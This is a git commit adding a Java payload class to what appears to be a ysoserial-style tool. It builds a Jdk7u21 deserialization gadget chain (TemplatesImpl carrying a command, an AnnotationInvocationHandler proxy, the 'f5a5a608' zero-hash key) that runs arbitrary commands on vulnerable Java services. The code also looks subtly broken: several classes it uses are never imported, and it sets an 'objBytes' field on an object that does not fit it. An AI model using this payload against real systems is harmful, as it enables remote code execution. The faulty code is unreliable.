3986700a22a925e853222385eb13eae3f80b5a6a
whyjoezk <58034833+whyjoezk@users.noreply.github.com>
2022-05-30 20:52:18 +0800

    Create Jdk7u21_0.java

---
+++ src/main/java/dogeser/payloads/Jdk7u21_0.java
@@ -0,0 +1,64 @@
+package dogeser.payloads;
+
+import java.lang.reflect.InvocationHandler;
+import java.util.HashMap;
+import java.util.LinkedHashSet;
+
+import javax.xml.transform.Templates;
+
+import dogeser.payloads.annotation.Authors;
+import dogeser.payloads.annotation.Dependencies;
+import dogeser.payloads.annotation.PayloadTest;
+import dogeser.payloads.util.Gadgets;
+import dogeser.payloads.util.JavaVersion;
+import dogeser.payloads.util.PayloadRunner;
+import dogeser.payloads.util.Reflections;
+
+
+@SuppressWarnings({ "rawtypes", "unchecked" })
+@PayloadTest( precondition = "isApplicableJavaVersion")
+@Dependencies()
+@dogeser.payloads.annotation.Authors({ Authors.FROHOFF })
+public class Jdk7u21_0 implements ObjectPayload<Object> {
+
+    public Object getObject(final String command) throws Exception {
+        final Object templates = dogeser.payloads.util.Gadgets.createTemplatesImpl(command);
+        //final MarshalledObject templates = new MarshalledObject(null);
+//        序列化原始Jdk7u21obj
+        Object obj = new Jdk7u21().getObject(command);
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutput objectOutput = null;
+        objectOutput = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutput.writeObject(obj);
+        objectOutput.flush();
+        byte[] bytearray = byteArrayOutputStream.toByteArray();
+        Reflections.setFieldValue(templates, "objBytes",
+                bytearray
+        );
+
+        String zeroHashCodeStr = "f5a5a608";
+        HashMap map = new HashMap();
+        map.put(zeroHashCodeStr, "foo");
+
+        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
+        Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);
+        Map proxy = Gadgets.createProxy(tempHandler, Map.class);
+        LinkedHashSet set = new LinkedHashSet(); // maintain order
+        set.add(templates);
+        set.add(proxy);
+
+        map.put(zeroHashCodeStr, templates); // swap in real object
+
+        return set;
+    }
+
+    public static boolean isApplicableJavaVersion() {
+        JavaVersion v = JavaVersion.getLocalVersion();
+        return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
+    }
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(Jdk7u21_0.class, args);
+    }
+
+}
